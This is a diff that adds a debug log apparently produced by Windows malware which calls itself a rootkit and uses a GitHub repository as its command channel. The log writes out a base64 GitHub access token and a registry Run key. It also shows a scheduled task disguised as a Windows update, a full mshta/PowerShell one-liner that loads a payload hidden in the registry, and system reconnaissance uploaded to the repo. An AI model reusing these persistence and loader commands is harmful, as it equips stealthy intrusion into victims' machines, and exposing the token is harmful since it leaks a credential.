@@ -1,0 +1,48 @@
+Thu Oct 28 23:23:15 2021. Initialisation of the log file.
+
+DEBUG: Thu Oct 28 23:23:15 2021: GithubLogin: hidemepls785
+DEBUG: Thu Oct 28 23:23:15 2021: GithubRepoName: furry-octo-parakeet
+DEBUG: Thu Oct 28 23:23:15 2021: Base64GihubAccessToken: Z2hwX2hZMGNCSmdGMXdabDJuallyRDZTRG1nWDJVZ0hhUzN3Y0lmbw==
+DEBUG: Thu Oct 28 23:23:15 2021: Rootkit Name: VetementPatronPreprod01
+DEBUG: Thu Oct 28 23:23:15 2021: Rootkit Registry Key: Sensors
+DEBUG: Thu Oct 28 23:23:15 2021: Schtasks Task Name: WindowsUpdatePolicies
+DEBUG: Thu Oct 28 23:23:15 2021: Run Registry Key Name: WindowsUpdate
+DEBUG: Thu Oct 28 23:23:15 2021: Admin Rights: 1
+DEBUG: Thu Oct 28 23:23:15 2021: Adding the actual location of the servant: C:\Users\ikY3qX\Downloads\yxyotumhunvmjsv.exe
+DEBUG: Thu Oct 28 23:23:16 2021: The folder list for random folder is not empty. Its size is: 452
+DEBUG: Thu Oct 28 23:23:16 2021: The random path choosed for this execution is: C:\Users\ikY3qX\AppData\LocalLow\Sun\Java\Deployment\cache\6.0\50
+DEBUG: Thu Oct 28 23:23:16 2021: Start of the method setRunRegistryCommand.
+DEBUG: Thu Oct 28 23:23:16 2021: Success to create the registry run key.
+DEBUG: Thu Oct 28 23:23:16 2021: Start of the method createSchTaskCommandLine. 
+DEBUG: Thu Oct 28 23:23:16 2021: This content will be written in the start up batch: @echo off
+mshta "javascript:close(new ActiveXObject('WScript.Shell').run('powershell \"[Reflection.Assembly]::Load([Microsoft.Win32.Registry]::CurrentUser.OpenSubKey(\\\"Software\\\\Microsoft\\\\Sensors\\\").GetValue($Null)).EntryPoint.Invoke(0,$Null)\"',0))"
+exit
+DEBUG: Thu Oct 28 23:23:16 2021: Start of the method writeFileWindowsApi.
+DEBUG: Thu Oct 28 23:23:16 2021: The content size that will be written: 264
+DEBUG: Thu Oct 28 23:23:16 2021: Success to write the content(number of bytes : 264) in the file : C:\Users\ikY3qX\AppData\Roaming\WindowsUpdateGroupPolicies.bat
+DEBUG: Thu Oct 28 23:23:16 2021: This command will be played: schtasks /create /TR "'cmd /MIN /c C:\Users\ikY3qX\AppData\Roaming\WindowsUpdateGroupPolicies.bat'" /TN WindowsUpdatePolicies /SC daily
+ERROR: Thu Oct 28 23:23:38 2021: The command for shtasks query did not work. Here is the command: schtasks /query /TN "WindowsUpdatePolicies" > "C:\Users\ikY3qX\AppData\LocalLow\Sun\Java\Deployment\cache\6.0\50\garbage.txt"
+DEBUG: Thu Oct 28 23:23:38 2021: End of the createSchTaskCommandLine method.
+DEBUG: Thu Oct 28 23:23:38 2021: The stager is not present on the system anymore.
+ERROR: Thu Oct 28 23:24:01 2021: Heart attack, the rootkit has major bug trying the parse the json from github api in the method fileExistsGithubRepo.
+ERROR: Thu Oct 28 23:24:01 2021: Unknown exception
+DEBUG: Thu Oct 28 23:24:01 2021: The survey file for this target could not be found. Trying to create it and upload it to the github repo.
+DEBUG: Thu Oct 28 23:24:17 2021: This command will be executed to know systeminfo: systeminfo > C:\Users\ikY3qX\AppData\LocalLow\Sun\Java\Deployment\cache\6.0\50\systeminfo.txt
+DEBUG: Thu Oct 28 23:24:40 2021: This command will be executed to know the last reboot time: wmic os get lastBootUpTime > C:\Users\ikY3qX\AppData\LocalLow\Sun\Java\Deployment\cache\6.0\50\systeminfo.txt
+DEBUG: Thu Oct 28 23:25:02 2021: Start of the method writeFileWindowsApi.
+DEBUG: Thu Oct 28 23:25:02 2021: The content size that will be written: 217
+DEBUG: Thu Oct 28 23:25:03 2021: Success to write the content(number of bytes : 217) in the file : C:\Users\ikY3qX\AppData\LocalLow\Sun\Java\Deployment\cache\6.0\50\ikY3qX-survey.txt
+DEBUG: Thu Oct 28 23:25:03 2021: Start of the method uploadFileToGithubRepo.
+DEBUG: Thu Oct 28 23:25:03 2021: Start of the method readFileWindowsApi for the file: C:\Users\ikY3qX\AppData\LocalLow\Sun\Java\Deployment\cache\6.0\50\ikY3qX-survey.txt
+DEBUG: Thu Oct 28 23:25:03 2021: The file that will be read weight: 217
+DEBUG: Thu Oct 28 23:25:04 2021: Success to read the binary file. This number of bytes have been read: 218
+DEBUG: Thu Oct 28 23:25:06 2021: The files ikY3qX-survey.txt has been uploaded successfully in the github repo
+DEBUG: Thu Oct 28 23:25:06 2021: Success deleting the survey file.
+DEBUG: Thu Oct 28 23:25:06 2021: Start of a new loop to get commands and treat them.
+DEBUG: Thu Oct 28 23:25:06 2021: Start of GithubCommunication::receiveInstructions
+DEBUG: Thu Oct 28 23:25:08 2021: Success to get the instance number of the current instance: rootkit_path1
+DEBUG: Thu Oct 28 23:25:08 2021: Success to check the commands with rootkit_path1
+DEBUG: Thu Oct 28 23:25:08 2021: No commands are given in the github repo.
+DEBUG: Thu Oct 28 23:25:08 2021: The receive method and the method to send the results return true, breaking the Servant Mission loop.
+DEBUG: Thu Oct 28 23:25:08 2021: This is the end of servant mission.
+DEBUG: Thu Oct 28 23:25:08 2021: Start of GithubCommunication::sendLogs
